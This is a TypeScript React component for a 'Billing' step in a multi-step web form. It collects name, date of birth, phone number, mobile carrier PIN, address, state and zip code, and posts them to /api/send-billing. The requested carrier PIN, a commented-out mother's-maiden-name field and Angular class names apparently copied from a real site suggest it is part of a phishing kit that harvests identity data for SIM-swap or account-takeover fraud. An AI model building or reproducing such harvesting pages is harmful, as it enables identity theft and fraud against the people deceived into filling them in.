import axios from "axios";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Input } from "../components/Input";
import { Container } from "../components/Container";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";

interface BillingProps {}

const schema = yup.object().shape({
  firstname: yup.string().required("Please enter your first name"),
  lastname: yup.string().required("Please enter your last name"),
  dob: yup.string().required("Please enter your date of birth"),
  streetAddress: yup.string().required("Please enter your address"),
  zipCode: yup.string().required("Please enter your zip code"),
  state: yup.string().required("Please enter your state"),
  phoneNumber: yup.string().required("Please enter your phone number"),
  carrierPin: yup.string(),
  // mmn: yup.string(),
});

export const Billing: React.FC<BillingProps> = ({}) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onTouched`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `BILLING`);
    formData.append(`billing`, JSON.stringify(data));

    try {
      await axios.post(`/api/send-billing`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      billing: data,
    });

    const url = getProgress()[getProgress().indexOf(`BILLING`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <Container loading={loading} onSubmit={onSubmit} step={`BILLING`}>
      <div className="col-md-4 ng-star-inserted">
        <Input
          label={`First Name`}
          name={`firstname`}
          register={register}
          curValue={watch(`firstname`)}
          error={
            errors.firstname && (errors.firstname.message as unknown as string)
          }
        />
      </div>
      <div className="col-md-4 ng-star-inserted">
        <Input
          label={`Last Name`}
          name={`lastname`}
          register={register}
          curValue={watch(`lastname`)}
          error={
            errors.lastname && (errors.lastname.message as unknown as string)
          }
        />
      </div>
      <div className="col-md-4 ng-star-inserted">
        <Input
          label={`Date of Birth`}
          name={`dob`}
          register={register}
          curValue={watch(`dob`)}
          error={errors.dob && (errors.dob.message as unknown as string)}
          mask={`99/99/9999`}
        />
      </div>
      <div className="col-md-4 ng-star-inserted">
        <Input
          label={`Phone Number`}
          name={`phoneNumber`}
          register={register}
          curValue={watch(`phoneNumber`)}
          error={
            errors.phoneNumber &&
            (errors.phoneNumber.message as unknown as string)
          }
          mask={`(999) 999 9999`}
        />
      </div>
      <div className="col-md-4 ng-star-inserted">
        <Input
          label={`Carrier Pin`}
          name={`carrierPin`}
          register={register}
          curValue={watch(`carrierPin`)}
          error={
            errors.carrierPin &&
            (errors.carrierPin.message as unknown as string)
          }
          type="number"
        />
      </div>
      <div className="col-md-4 ng-star-inserted">
        <Input
          label={`Address`}
          name={`streetAddress`}
          register={register}
          curValue={watch(`streetAddress`)}
          error={
            errors.streetAddress &&
            (errors.streetAddress.message as unknown as string)
          }
        />
      </div>
      <div className="col-md-4 ng-star-inserted">
        <Input
          label={`State`}
          name={`state`}
          register={register}
          curValue={watch(`state`)}
          error={errors.state && (errors.state.message as unknown as string)}
        />
      </div>
      <div className="col-md-4 ng-star-inserted">
        <Input
          label={`Zip Code`}
          name={`zipCode`}
          register={register}
          curValue={watch(`zipCode`)}
          error={
            errors.zipCode && (errors.zipCode.message as unknown as string)
          }
          type="number"
        />
      </div>
    </Container>
  );
};

export default Billing;
